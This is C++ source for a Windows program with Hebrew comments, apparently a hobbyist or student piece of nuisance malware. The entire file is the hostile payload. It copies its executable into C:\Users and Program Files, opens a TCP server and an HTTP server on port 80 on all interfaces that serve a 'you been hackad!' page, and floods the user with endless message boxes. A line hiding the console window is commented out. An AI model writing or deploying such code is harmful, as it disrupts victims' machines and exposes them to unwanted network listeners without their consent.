//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#pragma comment (lib, "ws2_32.lib")
#include <iostream>
#include "Communicator.h"
#include "WSAInitializer.h"
#include <iostream>
#include <WinSock2.h>
#include <fstream>
#include <windows.h>


#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "httpapi.lib")

#define MAX_BYTES 28
#define HTTP_PORT 80

DWORD WINAPI badServer(LPVOID lparam);
DWORD WINAPI httpServer(LPVOID lparam);

int main() {
    WSAInitializer wsa_init;
    BOOL cpy = false;

    // העתקת הקובץ
    int check = CopyFileExA("C:\\Program Files (x86)\\Project1.exe", "C:\\Users\\Project1.exe", NULL, NULL, &cpy, COPY_FILE_FAIL_IF_EXISTS);
    CopyFileExA("C:\\Users\\Project1.exe", "C:\\Program Files (x86)\\Project1.exe", NULL, NULL, &cpy, COPY_FILE_FAIL_IF_EXISTS);

    HANDLE hMyMutex = CreateMutexA(NULL, FALSE, "safeSafe");
    WaitForSingleObject(hMyMutex, INFINITE);

    LPCWSTR my_str = L"Muahahaah! you been hackad!";
    DWORD t = 1;

    // יצירת שרשורים לשרתים
    HANDLE lpHandlesTCP = CreateThread(NULL, 0, &badServer, &t, 0, NULL);
    HANDLE lpHandlesHTTP = CreateThread(NULL, 0, &httpServer, &t, 0, NULL);

    while (true) {
        Sleep(200);
        MessageBox(NULL, my_str, NULL, MB_OK);
    }

    WaitForSingleObject(lpHandlesTCP, INFINITE);
    WaitForSingleObject(lpHandlesHTTP, INFINITE);
    ReleaseMutex(hMyMutex);
}

// פונקציה של שרת ה-TCP
DWORD WINAPI badServer(LPVOID lparam) {
    Communicator httP_Server;
    httP_Server.serve();
    return 0;
}

// פונקציה לשרת HTTP בסיסי באמצעות WINAPI
DWORD WINAPI httpServer(LPVOID lparam) {
    WSADATA wsaData;
    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;

    // אתחול ה-Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }

    // יצירת ה-Socket
    ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ListenSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed" << std::endl;
        WSACleanup();
        return 1;
    }

    // הגדרת הכתובת של השרת
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(HTTP_PORT);

    // קשירה לכתובת
    if (bind(ListenSocket, (struct sockaddr*) &serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed" << std::endl;
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // התחלת האזנה
    if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen failed" << std::endl;
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "HTTP Server is listening on port 80..." << std::endl;

    while (true) {
        // קבלת חיבור מהלקוח
        ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed" << std::endl;
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        // תגובת HTTP בסיסית
        const char httpResponse[] =
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n\r\n"
            "<html><body><h1>Muahahaah! you been hackad!</h1></body></html>";

        send(ClientSocket, httpResponse, sizeof(httpResponse) - 1, 0);
        closesocket(ClientSocket);
    }

    closesocket(ListenSocket);
    WSACleanup();
    return 0;
}
